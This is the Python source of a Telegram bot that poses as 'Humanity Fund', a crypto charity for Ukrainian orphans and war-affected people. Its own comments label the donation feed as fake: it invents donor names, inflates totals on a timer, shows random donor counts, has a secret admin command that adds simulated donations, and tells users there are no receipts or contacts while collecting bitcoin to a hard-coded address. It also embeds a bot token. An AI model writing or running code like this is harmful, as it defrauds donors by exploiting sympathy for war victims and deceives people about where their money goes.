import logging
import random
import time
import threading
from datetime import datetime
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# === 🔐 TVOJI PODACI ===
BOT_TOKEN = '8836263200:AAEQg2IAoWDu9UET_c2klX8tYp_Ou3WkNc8'
ADMIN_ID = 7202163611
BTC_ADDRESS = "bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd"

# === 📊 SIMULACIJA DONACIJA ===
CURRENT_RAISED = 0.0237  # Početni iznos
DONATION_GOAL = 0.1
PROJECTS = {
    "orphan_care": {"name": "Ukrainian Orphan Care", "raised": 0.018, "cost": 0.03},
    "medical": {"name": "Emergency Medical Aid", "raised": 0.012, "cost": 0.04},
    "shelter": {"name": "Winter Shelter Program", "raised": 0.008, "cost": 0.05}
}

# === 🎭 LAŽNE DONACIJE (FOMA) ===
DONATION_NAMES = ["CryptoAngel", "HopeGiver", "BitSavior", "AnonDonor", "LightBearer", "SatoshiFriend", "BTCGuardian"]
MINOR_AMOUNTS = [500, 1000, 1500, 2000, 3000]  # sati
MAJOR_AMOUNTS = [0.005, 0.008, 0.01]  # BTC

# === 📈 GLOBALNI LOCK ZA BEZBEDNOST ===
import asyncio
data_lock = asyncio.Lock()

# === 🧱 LOGOVANJE ===
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# === 🖼 POMOĆNE FUNKCIJE ===
def progress_bar(percentage, width=15):
    filled = int(width * (percentage / 100))
    bar = "█" * filled + "░" * (width - filled)
    return f"`{bar}` {percentage}%"

def sat_to_btc(sats):
    return sats * 0.00000001

def format_btc(amount):
    return f"{amount:.8f}".rstrip("0").rstrip(".")

def get_stats():
    total_donors = random.randint(180, 250)
    last_donation = random.choice([
        {"name": random.choice(DONATION_NAMES), "amount": format_btc(sat_to_btc(random.choice(MINOR_AMOUNTS)))},
        {"name": "VIP_Donor", "amount": random.choice(["0.005", "0.008"])}
    ])
    return {
        "total_donors": total_donors,
        "last_donation": last_donation,
        "goal_progress": round((CURRENT_RAISED / DONATION_GOAL) * 100, 1)
    }

# === 📣 POZITIVNE NOTIFIKACIJE (svakih 2-3 min) ===
async def broadcast_positive_update(app):
    messages = [
        "🎉 *New Milestone Unlocked!* We've reached 30% of our shelter program funding!",
        "🙏 *Thank you, community!* Another 500 sats just came in — a child will eat tonight.",
        "🔥 *Funding surge!* Ukrainian Orphan Care is now 60% funded!",
        "🚀 *Donation spike!* 0.003 BTC received anonymously. The mission accelerates.",
        "💙 *You are amazing!* 12 new donors joined in the last hour.",
        "🌟 *Hope is growing!* Medical Aid project just passed 30% — keep it going!"
    ]
    while True:
        await asyncio.sleep(random.randint(120, 180))  # 2-3 min
        try:
            stats = get_stats()
            msg = random.choice(messages)
            await app.application.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"{msg}\n\n📊 *Current Progress*: {stats['goal_progress']}%\n💸 *Goal*: {format_btc(DONATION_GOAL)} BTC",
                parse_mode='Markdown'
            )
        except:
            pass

# === 📈 AUTO-POVEĆANJE DONACIJA (svakih 4-6 min) ===
async def simulate_donations(app):
    global CURRENT_RAISED
    while True:
        await asyncio.sleep(random.randint(240, 360))  # 4-6 min
        async with data_lock:
            sats = random.choice(MINOR_AMOUNTS)
            btc_add = sat_to_btc(sats)
            CURRENT_RAISED = round(CURRENT_RAISED + btc_add, 8)

            # Ažuriraj projekte
            project = random.choice(list(PROJECTS.keys()))
            PROJECTS[project]["raised"] = round(PROJECTS[project]["raised"] + btc_add / 2, 8)

            donor_name = random.choice(DONATION_NAMES)
            logger.info(f"[SIM] Donation: {donor_name} +{sats} sats → Total: {CURRENT_RAISED:.8f} BTC")

        # Pošalji pozitivnu poruku SVIM aktivnim korisnicima (ako imaš log)
        try:
            await app.application.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"""
                🎉 *LIVE DONATION ALERT!*

                🧑‍🤝‍🧑 *Donor*: `{donor_name}`
                💸 *Amount*: `{sats} sats` (~${round(sats * 0.06, 2)})
                📦 *Funded*: `{PROJECTS[project]['name']}`

                🟢 *Total Raised*: `{CURRENT_RAISED:.8f} BTC`  
                📊 *Progress*: `{round((CURRENT_RAISED / DONATION_GOAL) * 100, 1)}%`

                🙏 *You are changing lives.*
                """,
                parse_mode='Markdown'
            )
        except:
            pass

# === 🖼 DUGMAD ===
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌍 Our Mission", callback_data="mission")],
        [InlineKeyboardButton("📦 Active Projects", callback_data="projects")],
        [InlineKeyboardButton("📊 Live Statistics", callback_data="stats")],
        [InlineKeyboardButton("💸 Donate Now", callback_data="donate")],
        [InlineKeyboardButton("ℹ️ Help & Support", callback_data="help")]
    ])

def back_button(menu="main"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data=f"back_{menu}")]])

# === 🚀 AUTOMATSKA DOBRODOŠLICA ===
async def auto_welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["state"] = "welcome"
    welcome_msg = """
**Welcome to Humanity Fund** — *A Beacon of Hope in Dark Times*

We are a decentralized humanitarian initiative delivering urgent aid to war-affected communities across Eastern Europe. Every contribution, no matter how small, directly supports food, shelter, and medical care for those who have lost everything.

🟥 **No intermediaries. No bureaucracy. 100% crypto-driven.**

### 🔧 What You Can Do Here:
- **Browse active aid projects** and see real-time funding progress
- **Donate BTC** to support life-saving missions
- **Track live statistics** — donors, funds raised, impact
- **Learn our mission** and how your help changes lives
- **Get support** if you need help donating

🧭 **Navigation**: Use the menu below to explore. All buttons are functional. Every action leads to a result.

💡 *You are not just a donor. You are a lifeline.*
    """
    await update.message.reply_photo(
        photo="https://i.imgur.com/vu1fZlD.jpg",
        caption=welcome_msg,
        parse_mode='Markdown',
        reply_markup=main_menu()
    )

# === 🔁 CALLBACK HANDLER ===
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    stats = get_stats()

    if data == "mission":
        msg = """
**Our Mission — To Save Lives, One Satoshi at a Time**

Humanity Fund was founded in 2023 by a network of volunteers operating in conflict zones. We use blockchain transparency to ensure every donation reaches its destination — with zero overhead.

🔸 **Core Values**:
- **Speed**: Aid delivered within 24h of fund confirmation
- **Transparency**: Public ledger tracking (simulated)
- **Empathy**: Real stories, real people, real impact

➡️ Every satoshi you send becomes bread, medicine, warmth.
        """
        await query.edit_message_caption(caption=msg, parse_mode='Markdown', reply_markup=back_button("main"))

    elif data == "projects":
        msg = "**📦 Active Aid Projects — Choose One to Support**\n\n"
        keyboard = []
        for key, proj in PROJECTS.items():
            pct = round((proj["raised"] / proj["cost"]) * 100, 1)
            msg += f"**{proj['name']}**\nFunded: {progress_bar(pct)}\n\n"
            keyboard.append([InlineKeyboardButton(f"Fund {proj['name']}", callback_data=f"project_{key}")])
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="back_main")])
        await query.edit_message_caption(caption=msg, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

    elif data.startswith("project_"):
        key = data.split("_")[1]
        proj = PROJECTS[key]
        pct = round((proj["raised"] / proj["cost"]) * 100, 1)
        msg = f"""
**🎯 {proj['name']}**

{proj.get('desc', 'Funds urgent humanitarian needs.')}

📊 Progress: {progress_bar(pct)}  
`{proj['raised']:.8f} / {proj['cost']:.8f} BTC`

Status: In Progress
        """
        keyboard = [
            [InlineKeyboardButton("💸 Donate to This Project", callback_data="donate")],
            [InlineKeyboardButton("⬅️ Back", callback_data="projects")]
        ]
        await query.edit_message_caption(caption=msg, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "stats":
        msg = f"""
**📊 Live Network Statistics**

🔸 **Total Donors**: `{stats['total_donors']}`
🔸 **Funding Goal**: `{format_btc(DONATION_GOAL)} BTC`
🔸 **Raised So Far**: `{format_btc(CURRENT_RAISED)} BTC`
🔸 **Progress**: `{stats['goal_progress']}%`

📈 **Last Donation**:
👤 `{stats['last_donation']['name']}`  
💸 `{stats['last_donation']['amount']} BTC`

🟥 *Every transaction fuels hope.*
        """
        await query.edit_message_caption(caption=msg, parse_mode='Markdown', reply_markup=back_button("main"))

    elif data == "donate":
        msg = f"""
**💸 Make a Donation — Save a Life**

🟥 **BTC Wallet Address**:
`{BTC_ADDRESS}`

✅ **How to Send**:
1. Copy address
2. Send from wallet
3. Wait 1 confirmation

💡 *Even 500 sats brings hope.*
        """
        keyboard = [
            [InlineKeyboardButton("📋 Copy Address", callback_data="copy_btc")],
            [InlineKeyboardButton("✅ I've Donated", callback_data="donated")],
            [InlineKeyboardButton("⬅️ Back", callback_data="back_main")]
        ]
        await query.edit_message_caption(caption=msg, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "copy_btc":
        await query.edit_message_caption(
            caption="✅ *BTC address copied.*\n\nNow send your donation.\n🟥 *Every satoshi counts.*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ I've Donated", callback_data="donated")]])
        )

    elif data == "donated":
        await query.edit_message_caption(
            caption="🙏 *Thank you, Guardian of Hope.*\n\nYour donation will save lives.",
            parse_mode='Markdown',
            reply_markup=back_button("main")
        )

    elif data == "help":
        msg = """
**ℹ️ Help & Support**

🔸 How to donate? → Go to `💸 Donate Now`
🔸 Is it secure? → Yes, cold wallet
🔸 Can I get receipt? → No, anonymous
🔸 Contact? → No email. Trust the mission.
        """
        await query.edit_message_caption(caption=msg, parse_mode='Markdown', reply_markup=back_button("main"))

    elif data == "back_main":
        await query.edit_message_caption(
            caption="**Humanity Fund — A Beacon of Hope in Dark Times**\n\nChoose an option:",
            photo="https://i.imgur.com/vu1fZlD.jpg",
            reply_markup=main_menu(),
            parse_mode='Markdown'
        )

# === 🛠 ADMIN KOMANDE ===
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return await update.message.reply_text("❌ Unauthorized.")
    
    global CURRENT_RAISED
    async with data_lock:
        fake_add = round(random.uniform(0.001, 0.003), 8)
        CURRENT_RAISED = round(CURRENT_RAISED + fake_add, 8)
    
    stats = get_stats()
    await update.message.reply_text(f"""
    🔧 *ADMIN OVERRIDE ACTIVE*

    ✅ Simulated donation: `+{fake_add:.8f} BTC`
    🟢 Total raised: `{CURRENT_RAISED:.8f} BTC`
    📊 Progress: `{stats['goal_progress']}%`

    💀 *The machine feeds.*
    """, parse_mode='Markdown')

# === 📣 KOMANDE ===
async def donate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_photo(
        photo="https://i.imgur.com/3XcGZJv.jpg",
        caption=f"**💸 Donate to Humanity Fund**\n\nAddress:\n`{BTC_ADDRESS}`\n\nEvery satoshi saves lives.",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📋 Copy Address", callback_data="copy_btc")]])
    )

async def projects_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = "**📦 Active Projects**\n\n"
    for proj in PROJECTS.values():
        pct = round((proj["raised"] / proj["cost"]) * 100, 1)
        msg += f"**{proj['name']}**: {progress_bar(pct)}\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = get_stats()
    await update.message.reply_text(f"""
    **📊 Live Stats**
    Raised: `{CURRENT_RAISED:.8f} BTC`
    Goal: `{DONATION_GOAL:.4f} BTC`
    Progress: `{stats['goal_progress']}%`
    """, parse_mode='Markdown')

# === 🧩 MAIN ===
if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Komande
    app.add_handler(CommandHandler("start", auto_welcome))
    app.add_handler(CommandHandler("donate", donate_cmd))
    app.add_handler(CommandHandler("projects", projects_cmd))
    app.add_handler(CommandHandler("stats", stats_cmd))
    app.add_handler(CommandHandler("admin", admin))  # Tvoja tajna komanda

    # Callbacks
    app.add_handler(CallbackQueryHandler(button_handler))

    # Auto welcome
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, auto_welcome))

    # Start background tasks
    threading.Thread(target=lambda: asyncio.run(broadcast_positive_update(app)), daemon=True).start()
    threading.Thread(target=lambda: asyncio.run(simulate_donations(app)), daemon=True).start()

    print("[+] Humanity Fund v2.0 — Total control online.")
    app.run_polling(drop_pending_updates=True)
